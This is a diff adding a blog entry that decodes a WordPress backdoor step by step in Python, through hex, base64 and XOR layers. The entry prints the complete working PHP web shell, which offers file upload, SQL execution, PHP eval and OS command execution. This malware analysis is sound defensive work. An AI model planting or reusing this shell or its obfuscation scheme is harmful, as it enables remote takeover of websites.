@@ -1,0 +1,307 @@
+<?xml version='1.0' encoding='utf-8'?>
+<blog>
+<entry when='20130223T113917'>
+<title>Ad-hoc decoding a backdoor</title>
+<category>python</category>
+<category>php</category>
+<category>malware</category>
+<body>
+
+    <p>My mom's wordpress site has some malware on it, and she sent it to me
+        for a professional opinion.  The mystery file was called wp-rss3.php.
+        Looking at it showed that there was source code being encoded in it,
+        so understanding what it did would require decoding the data. 
+        I fired up a Python prompt, and started picking away.</p>
+
+<p>Read the file, and take a quick look to see what structure it has:</p>
+
+<code lang="py"><![CDATA[
+>>> wprss3 = open('wp-rss3.php').read()
+>>> wprss3[:100]
+'<?php $_8b7b="\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e";$_8b7b1f="\\x62\\x61\\x73\\x'
+]]></code>
+
+<p>The file is one long line, so let's split it into lines:</p>
+
+<code lang="py"><![CDATA[
+>>> wprss3 = wprss3.replace(' ', '\n').replace(';',';\n').splitlines()
+>>> len(wprss3)
+6
+>>> [len(l) for l in wprss3]
+[5, 70, 64, 28123, 13, 2]
+]]></code>
+
+<p>OK, six lines, one of which has the bulk of the data. Let's look at them:</p>
+
+<code lang="py"><![CDATA[
+>>> wprss3[0]
+'<?php'
+>>> wprss3[1]
+'$_8b7b="\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e";'
+]]></code>
+
+<p>The line 0 is uninteresting, but line 1 defines a string using hex escapes.
+    Lots of our steps here will require getting raw data from a string that is the
+    bulk of what we're looking at.  Splitting on double-quotes will get us pieces,
+    one of which is the one we want.  Rather than counting pieces to find the right
+    one, we know the one we want will be the longest piece.  So we can use max()
+    to find the longest piece:</p>
+
+<code lang="py"><![CDATA[
+>>> d = max(wprss3[1].split('"'), key=len)
+>>> d
+'\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e'
+]]></code>
+
+<p>One of Python's handy-dandy decoders is 'string_escape' which can turn a string
+    with backslash-x sequences into the correct string:</p>
+
+<code lang="py"><![CDATA[
+>>> d.decode('string_escape')
+'create_function'
+]]></code>
+
+<p>OK, so $_8b7b is "create_function", a PHP function.  Let's see what line 2 gives us:</p>
+
+<code lang="py"><![CDATA[
+>>> wprss3[2]
+'$_8b7b1f="\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65";'
+>>> max(wprss3[2].split('"'), key=len).decode('string_escape')
+'base64_decode'
+]]></code>
+
+<p>Interesting, now for the bulk of the data, line 3:</p>
+
+<code lang="py"><![CDATA[
+>>> wprss3[3][:100]
+'$_8b7b1f56=$_8b7b("",$_8b7b1f("JGs9MTQzOyRtPWV4cGxvZGUoIjsiLCIyMzQ7MjUzOzI1MzsyMjQ7MjUzOzIwODsyNTM7M'
+>>> wprss3[3][-100:]
+'OzI0MjsxNzU7Iik7JHo9IiI7Zm9yZWFjaCgkbSBhcyAkdilpZiAoJHYhPSIiKSR6Lj1jaHIoJHZeJGspO2V2YWwoJHopOw=="));'
+]]></code>
+
+<p>Mentally using our definitions of $_8b7b and $_8b7b1f, this is equivalent to:</p>
+
+<code lang="php"><![CDATA[
+$_8b7b1f56 = create_function("", base64_decode("JGs9MTQ...Hop0w=="));
+]]></code>
+
+<p>BTW, I did not know that PHP would execute function names in strings as simply as $fnname(),
+    but it does not surprise me.</p>
+        
+<p>What's in the base64 data?</p>
+
+<code lang="py"><![CDATA[
+>>> d = max(wprss3[3].split('"'), key=len).decode('base64')
+>>> len(d)
+21064
+>>> d[:100]
+'$k=143;$m=explode(";","234;253;253;224;253;208;253;234;255;224;253;251;230;225;232;167;202;208;202;2'
+>>> d[-100:]
+'33;175;175;175;175;242;130;133;242;175;");$z="";foreach($m as $v)if ($v!="")$z.=chr($v^$k);eval($z);'
+]]></code>
+
+<p>The decoded data is 20k long, and visual inspection shows that the middle is just lots of numbers
+    separated by semicolons.  The PHP code is decoding those numbers by XORing them with 143, using
+    them as ASCII codepoints, and evaluating the result.  So we want to perform the same decoding
+    to see what source code results:</p>
+
+<code lang="py"><![CDATA[
+>>> nums = max(d.split('"'), key=len).split(';')
+>>> len(nums)
+5246
+>>> nums[:10]
+['234', '253', '253', '224', '253', '208', '253', '234', '255', '224']
+>>> source = "".join(chr(int(n) ^ 143) for n in nums)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "<stdin>", line 1, in <genexpr>
+ValueError: invalid literal for int() with base 10: ''
+>>> source = "".join(chr(int(n) ^ 143) for n in nums if n)
+>>> print source
+]]></code>
+
+<p>This finally shows us the source of the backdoor which is executed when the page wp-rss3.php
+    is visited in a browser. I've reformatted it here slightly just to break long lines:</p>
+
+<code lang="php"><![CDATA[
+error_reporting(E_ERROR | E_WARNING | E_PARSE);
+ini_set('display_errors', "0");
+
+if ($_POST["p"] != "") {
+        $_COOKIE["p"] = $_POST["p"];
+        setcookie("p", $_POST["p"], time() + 3600);
+}
+
+if (md5($_COOKIE["p"]) != "ca3f717a5e53f4ce47b9062cfbfb2458") {
+        echo "<form method=post>";
+        echo "<input type=text name=p value='' size=50>";
+        echo "<input type=submit name=B_SUBMIT value='Check'>";
+        echo "</form>";
+        exit;
+}
+
+if ($_POST["action"] == "upload") {
+
+    $l=$_FILES["filepath"]["tmp_name"];
+    $newpath=$_POST["newpath"];
+    if ($newpath!="") move_uploaded_file($l,$newpath);
+    echo "done";
+
+} else if ($_POST["action"] == "sql") {
+
+    $query = $_POST["query"];
+    $query = str_replace("\'","'",$query);
+    $lnk = mysql_connect($_POST["server"], $_POST["user"], $_POST["pass"]) or die ('Not connected : ' . mysql_error());
+    mysql_select_db($_POST["db"], $lnk) or die ('Db failed: ' . mysql_error());
+    mysql_query($query, $lnk) or die ('Invalid query: ' . mysql_error());
+    mysql_close($lnk);
+    echo "done<br><pre>$query</pre>";
+
+} else if ($_POST["action"] == "runphp") {
+
+    eval(base64_decode($_POST["cmd"]));
+
+} else {
+
+    $disablefunc = @ini_get("disable_functions");
+    if (!empty($disablefunc)) {
+        $disablefunc = str_replace(" ","",$disablefunc);
+        $disablefunc = explode(",",$disablefunc);
+    } else $disablefunc = array();
+
+    function myshellexec($cmd) {
+        global $disablefunc;
+        $result = "";
+        if (!empty($cmd)) {
+            if (is_callable("exec") and !@in_array("exec",$disablefunc)) {
+                @exec($cmd,$result); $result = @join("\n",$result);
+            }
+            elseif (($result = `$cmd`) !== FALSE) {}
+            elseif (is_callable("system") and !@in_array("system",$disablefunc)) {
+                $v = @ob_get_contents(); 
+                @ob_clean(); 
+                @system($cmd); 
+                $result = @ob_get_contents(); 
+                @ob_clean(); 
+                echo $v;
+            }
+            elseif (is_callable("passthru") and !@in_array("passthru",$disablefunc)) {
+                $v = @ob_get_contents(); 
+                @ob_clean(); 
+                @passthru($cmd); 
+                $result = @ob_get_contents(); 
+                @ob_clean(); 
+                echo $v;
+            }
+            elseif (is_resource($fp = @popen($cmd,"r"))) {
+                $result = "";
+                while(!feof($fp)) {$result .= @fread($fp,1024);}
+                @pclose($fp);
+            }
+        }
+        return $result;
+    }
+        $cmd = stripslashes($_POST["cmd"]);
+        $cmd_enc = stripslashes($_POST["cmd_enc"]);
+        if ($_POST["enc"]==1){
+                $cmd=base64_decode($cmd_enc);
+        }
+        ?>
+<script language=javascript type="text/javascript">
+<!--
+var END_OF_INPUT = -1;
+var base64Chars = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W',
+'X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0',
+'1','2','3','4','5','6','7','8','9','+','/');
+var reverseBase64Chars = new Array();
+for (var i=0; i < base64Chars.length; i++){
+    reverseBase64Chars[base64Chars[i]] = i;
+}
+var base64Str;
+var base64Count;
+function setBase64Str(str){
+    base64Str = str;
+    base64Count = 0;
+}
+function readBase64(){
+    if (!base64Str) return END_OF_INPUT;
+    if (base64Count >= base64Str.length) return END_OF_INPUT;
+    var c = base64Str.charCodeAt(base64Count) & 0xff;
+    base64Count++;
+    return c;
+}
+function encodeBase64(str){
+    setBase64Str(str);
+    var result = '';
+    var inBuffer = new Array(3);
+    var lineCount = 0;
+    var done = false;
+    while (!done && (inBuffer[0] = readBase64()) != END_OF_INPUT){
+        inBuffer[1] = readBase64();
+        inBuffer[2] = readBase64();
+        result += (base64Chars[ inBuffer[0] >> 2 ]);
+        if (inBuffer[1] != END_OF_INPUT){
+            result += (base64Chars [(( inBuffer[0] << 4 ) & 0x30) | (inBuffer[1] >> 4) ]);
+            if (inBuffer[2] != END_OF_INPUT){
+                result += (base64Chars [((inBuffer[1] << 2) & 0x3c) | (inBuffer[2] >> 6) ]);
+                result += (base64Chars [inBuffer[2] & 0x3F]);
+            } else {
+                result += (base64Chars [((inBuffer[1] << 2) & 0x3c)]);
+                result += ('=');
+                done = true;
+            }
+        } else {
+            result += (base64Chars [(( inBuffer[0] << 4 ) & 0x30)]);
+            result += ('=');
+            result += ('=');
+            done = true;
+        }
+        lineCount += 4;
+        if (lineCount >= 76){
+            result += ('\n');
+            lineCount = 0;
+        }
+    }
+    return result;
+}
+function encodeIt(f){
+        l=encodeBase64(f.cmd.value);
+        f.cmd_enc.value=l;
+        f.cmd.value="";
+        f.enc.value=1;
+        f.submit();
+}
+//--></script>
+        <?
+
+    echo "<form method=post action='' onSubmit='encodeIt(this);return false;'>";
+    echo "<input type=text name=cmd value=\"".str_replace("\"","&quot;",$cmd)."\" size=150>";
+    echo "<input type=hidden name=enc value='0'>";
+    echo "<input type=hidden name=cmd_enc value=''>";
+    echo "<input type=submit name=B_SUBMIT value='Go'>";
+    echo "</form>";
+    if ($cmd != "") {
+        echo "<pre>";
+        $cmd=stripslashes($cmd);
+        echo "Executing $cmd \n";
+        echo myshellexec("$cmd");
+        echo "</pre>";
+        exit;
+    }
+}
+]]></code>
+
+<p>As you can quickly see, this is a nasty piece of work: it takes commands from
+    the client and will execute PHP code, or SQL, or OS shell commands.  I don't
+    understand all the back and forth of the forms handling here, but it doesn't 
+    matter, it's clearly intended to let a remote attacker have his way on your
+    machine.  Bad stuff.</p>
+
+<p>I wonder if a Wordpress installation could be checked for malware by looking for
+    files that are too high a proportion of base64-encoded text?</p>
+
+<p>I told my mom to remove the file, but I suspect there will be more cleaning up to do...</p>
+
+</body>
+</entry>
+</blog>
